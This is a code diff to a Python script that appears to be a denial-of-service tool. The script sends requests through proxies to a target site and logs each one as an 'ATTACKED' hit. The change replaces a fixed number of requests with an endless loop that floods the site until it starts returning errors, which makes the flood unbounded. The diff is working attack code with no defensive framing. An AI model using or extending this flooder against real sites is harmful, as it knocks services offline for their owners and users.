@@ -89,19 +89,21 @@ def mainth():
                     logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
                 scraper.proxies.update(
                     {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
-                response = scraper.get(site)
-                if 200 <= response.status_code <= 302:
-                    for i in range(settings.MAX_REQUESTS):
-                        response = scraper.get(site, timeout=10)
-                        attacks_number += 1
-                        logger.info("ATTACKED; RESPONSE CODE: " +
-                                    str(response.status_code))
-        else:
-            for i in range(settings.MAX_REQUESTS):
                 response = scraper.get(site, timeout=10)
+                if 200 <= response.status_code <= 302:
+                    while True:
+                        response = scraper.get(site, timeout=10)
+                        if response.status_code >= 400:
+                            break
+                        attacks_number += 1
+                        logger.info(f"ATTACKED {site}; RESPONSE CODE: {response.status_code}")
+        else:
+            while True:
+                response = scraper.get(site, timeout=10)
+                if response.status_code >= 400:
+                    break
                 attacks_number += 1
-                logger.info("ATTACKED; RESPONSE CODE: " +
-                            str(response.status_code))
+                logger.info(f"ATTACKED {site}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
     except ConnectionError as exc:
